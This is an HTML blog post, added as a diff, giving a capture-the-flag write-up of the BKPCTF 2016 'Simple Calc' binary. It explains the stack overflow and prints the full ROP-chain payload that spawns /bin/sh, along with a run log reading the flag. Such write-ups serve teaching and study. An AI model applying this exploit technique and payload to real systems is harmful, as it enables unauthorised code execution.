@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>BKPCTF 2016 - Simple Calc</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7 b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="gef">
+    <meta name="tags" content="ida">
+    <meta name="tags" content="bkpctf-2016">
+    <meta name="tags" content="x86">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="BKPCTF 2016 - Simple Calc"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7 b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-03-07 22:51:04+11:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-03-07 22:51:04+11:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="gef"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="ida"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="bkpctf-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="x86"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="BKPCTF 2016 - Simple Calc">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7 b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "BKPCTF 2016 - Simple Calc",
+  "headline": "BKPCTF 2016 - Simple Calc",
+  "datePublished": "2016-03-07 22:51:04+11:00",
+  "dateModified": "2016-03-07 22:51:04+11:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html",
+  "description": "Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7 b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">BKPCTF 2016 - Simple Calc</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">07 Mar 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <h3>Info</h3>
+<div class="highlight"><pre><span></span><code>~/cur/simple_calc<span class="w"> </span>$<span class="w"> </span>file<span class="w"> </span>b28b103ea5f1171553554f0127696a18c6d2dcf7
+b28b103ea5f1171553554f0127696a18c6d2dcf7:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>GNU/Linux<span class="o">)</span>,<span class="w"> </span>statically<span class="w"> </span>linked,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.24,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>3ca876069b2b8dc3f412c6205592a1d7523ba9ea,<span class="w"> </span>not<span class="w"> </span>stripped
+~/cur/simple_calc<span class="w"> </span>$<span class="w"> </span>checksec.sh<span class="w"> </span>--file<span class="w"> </span>b28b103ea5f1171553554f0127696a18c6d2dcf7
+RELRO<span class="w">           </span>STACK<span class="w"> </span>CANARY<span class="w">      </span>NX<span class="w">            </span>PIE<span class="w">             </span>RPATH<span class="w">      </span>RUNPATH<span class="w">      </span>FILE
+Partial<span class="w"> </span>RELRO<span class="w">   </span>No<span class="w"> </span>canary<span class="w"> </span>found<span class="w">   </span>NX<span class="w"> </span>enabled<span class="w">    </span>No<span class="w"> </span>PIE<span class="w">          </span>No<span class="w"> </span>RPATH<span class="w">   </span>No<span class="w"> </span>RUNPATH<span class="w">   </span>b28b103ea5f1171553554f0127696a18c6d2dcf7
+</code></pre></div>
+
+<h3>Vulnerability</h3>
+<p><code>simple_calc</code> offered a binary that expects us to make some calculations. It will ask for a number of calculations (say <em>N</em>) to perform and will <code>malloc()</code> <em>N</em>x4 bytes in the heap. If we decompile with <a href="https://www.hex-rays.com/products/ida/">IDA</a>, it'll look something like this:</p>
+<p><img alt="vuln_in_ida" src="https://i.imgur.com/aFaqYf6.png"></p>
+<p>Then a loop of <em>N</em> iterations will commence,
+each iteration offering to perform one of the possible arithmetic operations,
+ADD/SUB/MUL/DIV, or exit. Those operations perform pretty much what you expect of them,
+which take in 2 DWORD operands, and apply the function. What is worth noticing is that
+both operands and result are stored in the <code>.bss</code> (therefore at predictable
+addresses).</p>
+<div class="highlight"><pre><span></span><code><span class="k">[...]</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A84 add_operator_2  dd ?</span><span class="w">                    </span><span class="c1">; DATA XREF: adds+40</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A84</span><span class="w">                                         </span><span class="c1">; adds+69 ...</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A88 add_result      dd ?</span><span class="w">                    </span><span class="c1">; DATA XREF: adds+96</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A88</span><span class="w">                                         </span><span class="c1">; adds+9C ...</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A8C                 align 10h</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A90                 public div_operator_1</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A90 div_operator_1  dd ?</span><span class="w">                    </span><span class="c1">; DATA XREF: divs+13</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A90</span><span class="w">                                         </span><span class="c1">; divs+5E ...</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A94 div_operator_2  dd ?</span><span class="w">                    </span><span class="c1">; DATA XREF: divs+40</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A94</span><span class="w">                                         </span><span class="c1">; divs+69 ...</span>
+<span class="na">.bss</span><span class="o">:</span><span class="s">00000000006C4A98 div_result      dd ?</span><span class="w">                    </span><span class="c1">; DATA XREF: divs+9B</span>
+<span class="k">[...]</span>
+</code></pre></div>
+
+<p>By exiting, <code>simple_calc</code> performs a <code>memcpy()</code> of the malloc-ed buffer (whose
+length is controlled by us) into a stack buffer (of length 0x28 bytes) located
+at $rbp+40h.
+<img alt="overflow" src="https://i.imgur.com/0wcLH24.png"></p>
+<p>It is then easy to spot the trivial stack buffer overflow.</p>
+<h3>Exploitation</h3>
+<p>When an operation is finished, the resulting DWORD is stored inside the malloc-ed
+buffer at the offset corresponding of the main loop iteration.
+So the game here is to play with those (basic) arithmetic operations to
+write arbitrary data in the malloc-ed buffer: for example, if we want to write
+0x10001000 | 0x20002000 in our malloc-ed buffer, we would create 2 operations,
+then perform:</p>
+<ol>
+<li>an ADD with op1=0x10000000 and op2=0x00001000</li>
+<li>an ADD with op1=0x20000000 and op2=0x00002000</li>
+<li>and so on</li>
+</ol>
+<p>By calling successively the same arithmetic operation, say <code>ADD</code> (or any other),
+we have a predictable way to populate the malloc-ed buffer.</p>
+<p>To corrupt the memory we must fill the stack buffer entirely (40 bytes), so make
+at least 10 operations. The stack buffer is followed (in the memory layout) by
+variables, so we add 24 bytes of junk (3 QWORD), another QWORD for
+overwriting the SFP, and a last to overwrite RIP.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x42424242</span><span class="p">,</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># sfp</span>
+             <span class="mh">0x45454545</span><span class="p">,</span> <span class="mh">0x45454545</span><span class="p">,</span> <span class="c1"># rip</span>
+             <span class="p">]</span>
+</code></pre></div>
+
+<p>We execute and a SIGSEGV was well caught (as seen with
+<a href="https://github.com/hugsy/gef"><code>gef</code></a>) :</p>
+<p><img alt="gef" src="https://i.imgur.com/rn4XSOR.png"></p>
+<p>However, the faulty instruction is in the <code>free()</code> following the <code>memcpy()</code> and
+yet not in the return from the main function.
+<code>free()</code> is trying to remove the chunk pointed by the value stored in $rdi (here
+0x4444444444444444). However, a quick look in the man page (<code>man 3 free</code>) and we
+find our solution:</p>
+<blockquote>
+<p>The free() function frees the memory space pointed to by ptr,[...] If ptr is
+NULL, no operation is performed.</p>
+</blockquote>
+<p>So let's rebuild our stack accordingly:</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x42424242</span><span class="p">,</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+             <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="c1"># for free(NULL)</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># sfp</span>
+             <span class="mh">0x45454545</span><span class="p">,</span> <span class="mh">0x45454545</span><span class="p">,</span> <span class="c1"># rip</span>
+             <span class="p">]</span>
+</code></pre></div>
+
+<p>We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.</p>
+<div class="highlight"><pre><span></span><code><span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="o">.</span>
+<span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<span class="mh">0x40157c</span><span class="w">     </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">505</span><span class="o">&gt;</span><span class="w">  </span><span class="n">mov</span><span class="w">    </span><span class="n">edi</span><span class="p">,</span><span class="n">eax</span>
+<span class="mh">0x40157e</span><span class="w">     </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">507</span><span class="o">&gt;</span><span class="w">  </span><span class="n">call</span><span class="w">   </span><span class="mh">0x4156d0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
+<span class="mh">0x401583</span><span class="w">     </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">512</span><span class="o">&gt;</span><span class="w">  </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x401588</span><span class="w">     </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">517</span><span class="o">&gt;</span><span class="w">  </span><span class="n">leave</span>
+<span class="mh">0x401589</span><span class="w">     </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">518</span><span class="o">&gt;</span><span class="w">  </span><span class="n">ret</span><span class="w">         </span><span class="err">←</span><span class="w"> </span><span class="o">$</span><span class="n">pc</span>
+<span class="mh">0x40158a</span><span class="w">     </span><span class="n">nop</span><span class="w">    </span><span class="n">WORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
+<span class="mh">0x401590</span><span class="w">     </span><span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">&gt;</span><span class="w">  </span><span class="n">push</span><span class="w">   </span><span class="n">r14</span>
+</code></pre></div>
+
+<p>We want to have a shell (what else, right?) so we need all the gadgets to
+syscall execve('/bin/sh', 0, 0).</p>
+<p>Bypassing NX is not that hard, all we need are the right gadgets. We choose a
+writable address, and write '/bin//sh' (we arbitrarily chose 0x6c3110 in the
+<code>.bss</code>). Using <a href="https://github.com/JonathanSalwan/ROPgadget"><code>ropgadget</code></a> makes
+it easier than ever:</p>
+<div class="highlight"><pre><span></span><code><span class="mh">0x401c87</span><span class="err">:</span><span class="w">                  </span><span class="err">#</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">ret</span>
+<span class="mh">0x6c3110</span><span class="err">:</span><span class="w">                  </span><span class="err">#</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">address</span>
+<span class="mh">0x44db34</span><span class="err">:</span><span class="w">                  </span><span class="err">#</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">ret</span>
+<span class="mh">0x6e69622f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f2f</span><span class="p">,</span><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">//</span><span class="n">sh</span>
+<span class="mh">0x470f11</span><span class="w">                   </span><span class="err">#</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rsi</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">ret</span>
+<span class="mh">0x447233</span><span class="err">:</span><span class="w">                  </span><span class="err">#</span><span class="w"> </span><span class="n">mov</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="n">rsi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span>
+<span class="mh">0x479295</span><span class="w">                   </span><span class="err">#</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">edi</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">dec</span><span class="w"> </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax - 0x77</span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">ret</span>
+</code></pre></div>
+
+<p>At this stage, we have <code>/bin//sh</code> written @0x6c3110 and this address inside the
+EDI register. Then we can use the gadget <code>0x437aa9: pop rdx ; pop rsi ; ret</code> to populate RSI and
+RDX with 0. Because it embeds a libc, the binary is full of <code>syscall</code>
+instructions, we'll use the one at 0x435675.</p>
+<p>We now have our full chain:</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span>
+             <span class="mh">0x42424242</span><span class="p">,</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># overwritten vars</span>
+
+             <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="c1"># for free(NULL)</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># last overwritten vars</span>
+             <span class="mh">0x44444444</span><span class="p">,</span> <span class="mh">0x44444444</span><span class="p">,</span> <span class="c1"># sfp</span>
+
+             <span class="mh">0x401c87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># pop rsi ; ret</span>
+             <span class="mh">0x6c3110</span><span class="p">,</span>  <span class="mh">0x0</span><span class="p">,</span> <span class="c1"># addr rw</span>
+
+             <span class="mh">0x44db34</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># pop rax ; ret</span>
+             <span class="mh">0x6e69622f</span><span class="p">,</span> <span class="mh">0x68732f2f</span><span class="p">,</span>  <span class="c1">#  /bin//sh</span>
+
+             <span class="mh">0x470f11</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># mov qword ptr [rsi], rax ; ret</span>
+
+             <span class="mh">0x447233</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># mov    rax,rsi; ret</span>
+             <span class="mh">0x479295</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># mov edi, eax ; dec dword ptr [rax - 0x77] ; ret</span>
+
+             <span class="mh">0x44db34</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="c1"># pop rax</span>
+             <span class="mh">0x3b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># syscall_execve</span>
+
+             <span class="mh">0x437aa9</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="c1"># pop rdx ; pop rsi ; ret</span>
+             <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+             <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+
+             <span class="mh">0x435675</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># syscall()</span>
+    <span class="p">]</span>
+</code></pre></div>
+
+<p>Run and pwn !</p>
+<div class="highlight"><pre><span></span><code>/cur/simple_calc<span class="w"> </span>$<span class="w"> </span>./simple_calc.py<span class="w">                                                                                                                                         </span><span class="o">[</span><span class="m">23</span>:36<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>localhost:5400
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Running<span class="w"> </span><span class="m">45</span><span class="w"> </span>calculations
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">2</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">3</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">4</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">5</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">6</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Iter<span class="w"> </span><span class="m">7</span>:<span class="w"> </span>got<span class="w"> </span>result<span class="w"> </span>0x41414141
+<span class="o">[</span>...<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Triggering<span class="w"> </span>exploit
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>it,<span class="w"> </span>interacting<span class="w"> </span><span class="o">(</span>Ctrl-C<span class="w"> </span>to<span class="w"> </span><span class="k">break</span><span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Get<span class="w"> </span>a<span class="w"> </span>PTY<span class="w"> </span>with<span class="w"> </span><span class="s1">&#39; python -c &quot;import pty;pty.spawn(&#39;</span>/bin/bash<span class="s1">&#39;)&quot;  &#39;</span>
+ls
+key
+simple_calc
+cat<span class="w"> </span>key
+BKPCTF<span class="o">{</span>what_is_2015_minus_7547<span class="o">}</span>
+</code></pre></div>
+
+<p>The full exploit is <a href="https://gist.github.com/hugsy/88e7137466505e0402ca">here</a>.</p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=BKPCTF 2016 - Simple Calc&amp;url=https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/gef">gef</a><a href="https://blahcat.github.io/tag/ida">ida</a><a href="https://blahcat.github.io/tag/bkpctf-2016">bkpctf-2016</a><a href="https://blahcat.github.io/tag/x86">x86</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=BKPCTF 2016 - Simple Calc">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">BKPCTF 2016 - Complex Calc</h2>
+                            <p class="post-nav-excerpt">The challenge is the sequel to simple_calc. If you haven't read our write-up, now is...</p>
